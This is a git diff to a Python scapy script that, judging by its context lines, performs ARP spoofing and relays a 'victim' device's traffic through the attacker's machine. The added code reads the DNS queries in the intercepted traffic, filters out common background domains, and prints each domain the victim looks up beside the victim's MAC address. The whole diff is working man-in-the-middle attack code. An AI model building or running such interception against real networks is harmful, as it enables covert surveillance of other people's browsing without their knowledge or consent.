@@ -3,6 +3,12 @@ from scapy.layers.l2 import Ether, ARP
 import threading
 import time
 
+NOISE = {
+    "wpad.lan", "msftconnecttest.com", "microsoft.com",
+    "windowsupdate.com", "steamserver.net", "napps-1.com",
+    "datadoghq.com", "onetrust.com", "onetrust.io",
+    "gstatic.com", "msftncsi.com", "local."
+}
 
 def get_mac(ip):
     packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
@@ -26,6 +32,12 @@ def forward_packet(packet, victim_mac, gateaway_mac, my_mac):
         return
 
     if packet[Ether].src == victim_mac:
+        if packet.haslayer(DNS) and packet.haslayer(UDP) and packet[UDP].dport == 53 and packet[DNS].qd:
+            domain = packet[DNS].qd.qname.decode()
+            root = ".".join(domain.rstrip(".").split(".")[-2:])  # Getting the domain root
+            src_mac = packet[Ether].src
+            if root not in NOISE:
+                print(f"{src_mac} → {root}")
         packet[Ether].src = my_mac
         packet[Ether].dst = gateaway_mac
         sendp(packet, verbose=0)
@@ -34,6 +46,7 @@ def forward_packet(packet, victim_mac, gateaway_mac, my_mac):
         packet[Ether].src = my_mac
         packet[Ether].dst = victim_mac
         sendp(packet, verbose=0)
+
 
 def start_forwarding(victim_mac, gateaway_mac, my_mac):
     sniff(
